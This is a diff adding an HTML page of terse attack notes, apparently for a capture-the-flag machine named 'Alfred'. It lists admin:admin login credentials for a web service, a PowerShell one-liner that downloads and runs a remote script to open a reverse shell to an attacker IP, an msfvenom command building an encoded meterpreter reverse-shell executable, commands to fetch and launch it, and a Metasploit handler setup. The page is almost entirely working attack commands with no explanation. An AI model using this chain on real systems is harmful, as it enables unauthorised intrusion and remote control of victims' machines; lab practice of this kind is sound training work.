@@ -1,0 +1,67 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Alfred</title>
+</head><body><img height="320" src="image.png" width="800"/>alfred@wayneenterprises.com<br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+http://10.10.44.162:8080/login?from=%2F<br/>
+<br/>
+username/password admin:admin<br/>
+<br/>
+Enter into new project commands<br/>
+powershell invoke-expression (New-Object Net.WebClient).DownloadString('http://10.13.17.108/invoke-powershellTCP.ps1');invoke-powershellTCP -Reverse -IPAddress 10.13.17.108 -Port 4444<br/>
+<br/>
+<br/>
+<br/>
+After gaining shell: <b>upgrade to meterpreter<br/>
+</b><br/>
+<span style="font-family: Ubuntu"><div style="text-align: left"><span style="font-size: 12pt">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.17.108 LPORT=6969 -f exe -o shell.exe</span><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+</span></div></span><br/>
+UPDOG: http://10.13.17.108:9090/shell.exe<br/>
+<br/>
+<span style="font-family: Ubuntu"><div style="text-align: left"><span style="font-size: 10pt">powershell &quot;(New-Object System.Net.WebClient).Downloadfile('http://10.13.17.108:9090/yshell.exe','yshell.exe')&quot;</span><span style="font-size: 16pt"><br/>
+</span></div></span><br/>
+<br/>
+<br/>
+start metasploit handler:<br/>
+<div style="text-align: left"><span style="font-family: Ubuntu"><span style="font-size: 12pt">use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run</span><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+</span></span></div><br/>
+<br/>
+START EXPLOIT ON WINDOWS SERVER<br/>
+Start-Process &quot;yshell.exe&quot;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
